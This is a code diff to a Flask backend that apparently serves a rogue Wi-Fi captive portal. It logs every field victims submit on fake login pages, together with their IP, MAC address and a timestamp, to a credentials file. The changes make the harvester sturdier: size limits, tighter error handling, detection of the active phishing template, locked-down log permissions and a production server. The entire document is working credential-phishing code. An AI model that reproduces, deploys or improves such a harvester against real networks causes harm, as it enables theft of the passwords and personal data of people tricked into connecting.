@@ -3,6 +3,7 @@ from flask import Flask, request, redirect
 import json, os, datetime
 
 app = Flask(__name__)
+app.config['MAX_CONTENT_LENGTH'] = 64 * 1024
 LOG_FILE = '/var/log/pinapple/creds.log'
 
 def get_client_mac(ip):
@@ -13,9 +14,18 @@ def get_client_mac(ip):
                 parts = line.split()
                 if len(parts) >= 4 and parts[0] == ip:
                     return parts[3]
-    except:
+    except OSError:
         pass
     return 'unknown'
+
+
+def active_portal_name():
+    try:
+        target = os.readlink('/opt/pinapple/portal/index.html')
+        return os.path.splitext(os.path.basename(target))[0] or 'unknown'
+    except OSError:
+        return 'unknown'
+
 
 @app.route('/portal/submit', methods=['POST'])
 def submit():
@@ -26,12 +36,16 @@ def submit():
         'timestamp': datetime.datetime.now().isoformat(),
         'client_ip': client_ip,
         'client_mac': client_mac,
-        'portal_type': data.get('portal_type', 'unknown'),
+        'portal_type': data.get('portal_type') or active_portal_name(),
         'data': {k: v for k, v in data.items() if k != 'portal_type'}
     }
     os.makedirs('/var/log/pinapple', exist_ok=True)
     with open(LOG_FILE, 'a') as f:
         f.write(json.dumps(entry) + '\n')
+    try:
+        os.chmod(LOG_FILE, 0o600)
+    except OSError:
+        pass
     return redirect('/portal/success')
 
 @app.route('/portal/success')
@@ -39,8 +53,13 @@ def success():
     try:
         with open('/opt/pinapple/portal/success.html') as f:
             return f.read()
-    except:
+    except OSError:
         return '<h1>Connected!</h1>'
 
 if __name__ == '__main__':
-    app.run(host='127.0.0.1', port=5000)
+    try:
+        from waitress import serve
+    except ImportError:
+        app.run(host='127.0.0.1', port=5000)
+    else:
+        serve(app, host='127.0.0.1', port=5000, threads=4)
